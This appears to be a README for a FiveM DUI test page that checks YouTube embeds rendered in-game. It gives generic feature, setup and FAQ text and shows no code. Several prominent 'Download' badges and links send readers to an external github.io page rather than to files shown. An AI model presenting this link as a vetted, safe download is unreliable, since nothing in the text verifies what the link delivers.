# DUI YouTube Test v2026 - Game Script Utility 2026

> **FiveM DUI test page for checking external YouTube embeds and browser-embedded media rendering in-game.** Created as a compact HTML utility for confirming DUI playback behavior on the FiveM platform.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/owenwalker1995/dui-youtube-script-test?style=flat-square)](https://github.com/owenwalker1995/dui-youtube-script-test)

---

<p align="center">
  <a href="https://owenwalker1995.github.io/dui-youtube-script-test/">
    <img src="https://img.shields.io/badge/Download-DUI%20YouTube%20Test%20Script-brightgreen?style=for-the-badge" alt="Download DUI YouTube Test Script">
  </a>
</p>

> **[Direct Download - DUI YouTube Test](https://owenwalker1995.github.io/dui-youtube-script-test/)**

---

[Download Latest Build](https://owenwalker1995.github.io/dui-youtube-script-test/)

---

## What This Is

DUI YouTube Test is a purpose-built HTML page for FiveM setups that need a quick way to verify YouTube embeds. It exists to help you inspect how browser media behaves inside the game, with a specific focus on DUI surfaces and external content playback.

The page is kept deliberately minimal so it works well as a fast validation tool instead of a feature-heavy interface. Use it when you need to see whether an embed opens correctly, how it is drawn by the browser layer, and whether the in-game render path handles the media properly.

## Script Features

- External YouTube embed testing
- FiveM DUI support
- HTML-based test page
- Lightweight layout for quick validation
- Browser-embedded media handling checks
- Designed for in-game rendering scenarios
- Simple structure for repeatable media tests
- Minimal setup for fast iteration

## Setup

1. Download the latest build from the project link above.
2. Put the HTML files into your resource or test folder, using the suggested project folder name if needed.
3. Load the page through your FiveM DUI workflow or local test resource.
4. Change the embedded YouTube source as needed for your test case.

Example flow:

- Add the HTML page to the resource directory
- Point your DUI or browser media test to the page
- Open it in-game and confirm the embed behavior

## Options

Edit the page source to choose the test target and tweak any local presentation details.

| Setting | Purpose | Example |
| --- | --- | --- |
| YouTube embed URL | Chooses the media source used for validation | `https://www.youtube.com/embed/VIDEO_ID` |
| Page layout | Keeps the test view compact and easy to inspect | Lightweight HTML structure |
| Resource path | Location where the page is stored in your FiveM setup | `dui-youtube-test-v2026/` |
| Browser media check | Verifies how embedded content appears in DUI | In-game render test |

If you need different content, replace the embed URL in the HTML and reload the resource.

## Compatibility

This project is intended for FiveM environments that rely on DUI and browser-based rendering. It is centered on in-game testing of embedded YouTube content, so the outcome will depend on the current game build, resource loading approach, and browser media behavior.

Known limitations:

- It is a test page, not a full media framework
- Results can vary depending on FiveM and browser rendering behavior
- External media availability may affect the test outcome
- Some setups may require local adjustments to the HTML source

## FAQ

**How do I use it?**  
Download the files, place them in your FiveM resource folder, and load the HTML page through your DUI test setup.

**Can I change the video being tested?**  
Yes. Update the YouTube embed source in the HTML file with the content you want to verify.

**Does it support other media types?**  
The project is focused on YouTube embed checks and browser media rendering validation. Broader usage depends on how your setup handles HTML and DUI content.

**What if the page does not display correctly?**  
Check the resource path, embed URL, and in-game DUI configuration. Browser behavior and media availability can also affect the result.

**Can I customize the layout?**  
Yes. Because the page is HTML-based, you can adjust the structure or styling to fit your test needs.

**Where should I store the files?**  
Keep them in a dedicated resource or test folder, such as the suggested project directory, so the DUI page is easy to find and update.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
